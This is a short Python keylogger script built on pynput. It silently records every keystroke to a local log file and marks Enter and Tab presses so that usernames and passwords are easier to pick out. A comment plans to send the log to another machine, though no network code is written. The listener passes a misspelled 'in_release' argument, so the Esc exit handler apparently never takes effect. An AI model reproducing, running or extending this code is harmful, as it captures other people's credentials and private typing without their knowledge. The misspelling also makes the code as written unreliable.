import pynput

from pynput.keyboard import Key, Listener

# initialization variables
count = 0 # standard counter
keys = [] # a list that will store the key inputs

## Make it so that the keylogger can be ran on one 
## machine and output the log file to another machine

# a function that is executed when a key is pressed 
def on_press(key):
    global keys, count

    # add pressed key to the list and print out which 
    # key was pressed
    keys.append(key)
    count += 1
    print(" {0} pressed ".format(key))

    # when the count is greater than or equal to 5
    # reset the count, write to the text file, and
    # reset the keys list
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

# fucntion that writes the key list to the output file
def write_file(keys):
    with open("log.txt", "a") as f: # w = write, a = add?
        for key in keys:
            #remove the ' around every input
            k = str(key).replace("'", "").replace("Key.", "")
            
            # Using the Enter or Tab key could mean that 
            # someone is typing a username and/or password. 
            # This will help a team member easily identify them
            if key == Key.enter or key == Key.tab:
                f.write("\n")
            # Keylogger recognizes uppercase characters so having
            # the shift in the output file is unecessary
            elif key == Key.shift:
                continue
            else:
                f.write(k + " ")


# Should exit the program when an Esc key is pressed
def on_release(key):
    if key == Key.esc:
        return False

# Listens in on the keyboard inputs and executes the functions 
# on_press and on_release when a key is pressed
with Listener(on_press=on_press, in_release=on_release) as listener:
    listener.join()



